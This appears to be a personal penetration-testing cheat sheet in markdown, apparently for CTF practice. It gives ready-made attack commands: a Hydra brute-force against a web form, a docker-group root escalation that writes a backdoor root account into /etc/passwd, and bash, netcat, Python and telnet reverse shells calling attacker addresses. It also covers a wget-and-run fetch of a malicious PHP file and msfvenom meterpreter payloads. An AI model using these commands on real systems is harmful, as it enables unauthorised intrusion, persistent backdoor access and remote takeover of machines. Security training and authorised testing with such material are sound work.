### Python simple HTTP server
```Python
python -m SimpleHTTPServer 
```
### Kali Linux assign two network interfaces
Edit `/etc/network/interfaces` and add these lines
```
auto eth0 
iface eth0 inet dhcp 
 
 
auto eth1 
iface eth1 inet dhcp 

```
And then restart the network with following commands.
```bash
systemctl stop networking 
systemctl start networking 
```
### Get interactive bash shell using python
```Python
python -c "import pty;pty.spawn('/bin/bash')"
```
### Get interactive bash shell using OS.System
```
echo os.system('/bin/bash')
```
## Helpful firefox addons
### FoxyProxy
> FoxyProxy is a Firefox extension which automatically switches an internet connection across one or more proxy servers based on URL patterns. Put simply, FoxyProxy automates the manual process of editing Firefox's Connection Settings dialog. Proxy server switching occurs based on the loading URL and the switching rules you define
### Fireforce
> brute-force attacks on GET or POST forms

### Poster
> A developer tool for interacting with web services and other web resources that lets you make HTTP requests, set the entity body, and content type. 

## Brute-force techniques
### THC Hydra
```bash
hydra -l admin -P /usr/share/wordlist/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 35644
```
## Privilege Escalation Techniques
[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Offensive Bash Scripts](https://github.com/6odhi/myarsenal/blob/master/README.md)
### User part of docker group   
You land on a computer and `id` shows you're part of the `docker` group. Escalate to root with:

```bash
$> docker run -it --rm -v $PWD:/mnt bash
```

adds backdoor toor:password
```bash
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
``` 
## Reverse shell techniques
### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### Netcat
```bash
nc -e /bin/sh 10.0.0.1 1234
```
### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
### Few more reverse shell techniques
courtesy: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

```bash
#1
nc <attacker_ip> <port> -e /bin/bash
#2
mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#3
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
#4
mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
#5
telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>
#7
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
```
### Reverse shell payload using msfvenom
```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.172.4 lport=443 -f raw

# widows asp reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.172.4 lport=2222 -e x86/shikata_ga_nai -f asp > met.asp 

# jsp reverse shell payload
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.172.4 lport=2222 -f raw > cmd.jsp

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.172.4 LPORT=2222 -f war > shell.war
```
## Miscellaneous Techniques
### Checking SUID files available in the system by running
> SUID(Set owner User ID up on execution) is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file ownerâs permissions as well as owner UID and GID when executing a file/program/command
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm +4000 2> /dev/null
```

Set and Unset SUID on files:
```bash
$ sudo chmod u+s /usr/bin/whoami # set SUID for whoami

$ sudo chmod u-s /usr/bin/whoami # Unset SUID
```
### Port and Host IP Scanning without NMap/Permissions
[No Nmap, No Permissions, No Problem](https://www.lanmaster53.com/2010/04/16/no-nmap-no-permissions-no-problem/)
## *Nix Commands
